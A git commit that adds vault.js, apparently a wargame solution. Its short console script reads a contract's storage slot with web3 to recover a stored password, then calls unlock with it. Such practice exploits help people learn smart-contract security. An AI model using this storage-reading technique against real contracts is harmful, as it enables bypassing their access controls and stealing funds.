2cd636ca531cd6d24c7dffa86abe730fbe55d758
malik <aremumalik01@gmail.com>
2022-10-28 19:39:42 +0100

    Create vault.js

---
+++ vault.js
@@ -0,0 +1,4 @@
+//just call this in the console
+   let ans = await web3.eth.getStorageAt(/*replace with contract address*/"0x1CC87bE137D252a64eBABC1Dbca95D666b4883eB", 1);
+   await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
+   
